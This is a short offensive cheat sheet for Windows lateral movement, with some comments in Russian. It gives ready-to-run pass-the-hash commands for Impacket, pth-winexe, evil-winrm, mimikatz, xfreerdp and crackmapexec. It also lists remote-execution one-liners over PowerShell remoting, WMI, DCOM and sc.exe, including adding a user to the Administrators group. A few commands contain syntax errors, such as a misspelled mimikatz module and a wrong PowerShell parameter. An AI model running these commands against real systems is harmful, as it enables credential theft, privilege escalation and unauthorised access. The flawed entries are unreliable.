## Pass the Hash:  
**Impacket and pth**:  
1) psexec.py -hashes LM:NTLM admin@target  
2) wmiexec.py -hashes :NTLM admin@target  
3) pth-winexe -U admin% //target cmd  
4) pth-wmic -U admin% //target "select Name from Win32_UserAccount"  
5) pth-wmis -U admin% //target "cmd.exe /c whoami > c:\out.txt"
6) pth-smbclient -U admin% //target/c$
7) pth-rpcclient -U admin% //target
8) pth-sqsh -U admin -S target
9) pth-curl http://target/exec?cmd=ipconfig
10) pth-net rpc group ADDMEM 'Administrators' username -S target -U domain/user

**Evil-winrm**:  
evil-winrm -i target -u admin -H "NT hash value"

**Windows (mimikatz)**:  
mimikatz.exe securlsa::pth /user:username /domain:domain /ntlm:NTLM_HASH /run:cmd  

**RDP**:  
xfreerdp /u:<user> /d:domain /pth:hash /v:ipAddr 

**CME**:  
crackmapexec smb <IP> -u username -H ":NT hash value"  

## PowerShell-Remoting: 

Enter-PSSession -ComputerName <computername> -Credentials <domain>\username  

Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName <computername> -Credentials <domain>\username  

$session = New-PSSession -ComputerName <computer name> -verbose  
Enter-PSSession -Session $session -Verbose  
Invoke-Command -Session $session -ScriptBlock {whoami;hostname} -Verbose  

## REG.EXE:  
reg.exe; //Удаленный доступ к реестру с правами на запись на самом деле нам дает RCE.  
  
## DCERPC:  
Использует порты 135/TCP и 4915x/TCP, где 4915x — динамически назначаемые порты. Иногда могут использоваться порты из другого диапазона.  

1. wmiexec.py; //wmiexec.py admin@target; //wmiexec.py -nooutput admin@target "mkdir c:\pwn".  
2. dcomexec.py; //dcomexec.py admin@target; //dcomexec.py -nooutput admin@10.0.0.64 "mkdir c:\123".  
3. wmis; //wmis -U admin //target "mkdir c:\pwn"/  
4. wmic.exe; //wmic.exe /user:username /password:s3cr3t /node:target process call create '"c:\123".  
5. sc.exe; //Назначение инструмента — удаленное управление службами и драйверами. 
    - sc.exe \\target create testservice binPath= \path\to\prog start= auto  
    - sc.exe \\target start testservice  
